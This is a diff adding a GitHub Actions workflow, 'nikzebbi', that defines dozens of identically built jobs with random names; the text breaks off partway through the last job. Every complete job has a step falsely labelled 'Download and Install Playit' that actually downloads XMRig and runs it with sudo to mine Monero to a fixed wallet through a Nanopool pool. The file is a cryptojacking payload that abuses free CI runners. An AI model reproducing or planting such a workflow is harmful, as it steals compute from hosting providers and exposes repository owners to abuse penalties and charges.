@@ -1,0 +1,3022 @@
+name: nikzebbi
+
+on: 
+  workflow_dispatch:
+
+jobs:
+  zxttmcfncqccrkcn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  fuvnqlfxhdfreqpcs:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+  qadpbbrcosdsjuzp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  lqnyzjuesungnhmrd:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  edqgkjypbtqceznx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  nviqdzevzdhchymum:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  wuftytyutbyjmuup:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  maycmjrhbgyegbbar:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  pfgsgowdukxyxdgu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  eooozaekytoqjjqcx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  qegjbqhpqcayufax:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  sqphjtfetetqczkhz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vnvgrvznenjhwofc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vmjpwyepkqsmglxxg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  tzqmnkuqdbrygagg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  uxnlqodhpdsgjrlys:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  iugnvcxffnfhatal:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  axqtevwbamspdzugm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ohykkyhwrhfkhonk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vpbsrsiatljylwewq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  uuizogakjmwhzenz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  leumjhabocurzmhfm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  yobazjzcqeolkjvj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ikuenfobhqgxxgxhc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ayoeupdbjhyyrnpq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qjoecnjjcxvvcocuv:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  cvpfhgfvguaapwqz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vntgxjgtclsnnwzph:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  qvbhthriagegwbrm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  mxkpfvrcihxyksgrr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  durvkyntohfjbcsp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xoisfywknjqccvekx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vnfrotwbmupnfvqx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  mnyhdfijzfjxwthpw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ndecxacldzseqrzg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  clrrsiryigqvdahog:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  szwmcuyjhstdyzfu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wozbzrvqbyccnbrku:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  xakojajdsqfrdbzt:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  mylrrgiwszhlsnzhp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ysfnsuibezfjeyil:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  auhoatsfrwjalptof:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  dnfrorbkehwzhywj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  tolkauviyqzpwdplj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  mckbnbbrpvwltctz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  dwkeeiylxtrvcstyw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
